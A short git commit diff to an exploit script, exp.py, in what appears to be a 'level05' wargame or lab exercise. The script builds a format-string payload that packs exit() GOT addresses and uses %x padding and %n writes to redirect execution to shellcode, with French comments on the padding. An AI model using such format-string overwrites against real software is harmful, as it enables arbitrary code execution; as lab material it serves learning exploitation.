e25fe7109cb2c397083a77bee19a44f21fc5ad23
elgrusko <45894554+elgrusko@users.noreply.github.com>
2020-10-15 23:28:42 +0200

    Update exp.py

--- level05/Ressources/exp.py
+++ level05/Ressources/exp.py
@@ -9,8 +9,7 @@ def pad(s):
 exploit = ""
 exploit += struct.pack("I", EXIT_PLT)
 exploit += struct.pack("I", EXIT_PLT+2)
-exploit += "BBBBCCCC"
-exploit += "%4$56935x"           # 2 derniers byte de l'adresse de notre shellcode (en decimal) auquel on soustrait 25 (padding)
+exploit += "%4$56935x"           # 2 derniers byte de l'adresse de notre shellcode (en decimal) auquel on soustrait 17 (padding)
 exploit += "%10$n "*10
 exploit += "%8987006x"           # bidouiller jusqu'a obtenir 0xffff
 exploit += "%11$n"*10
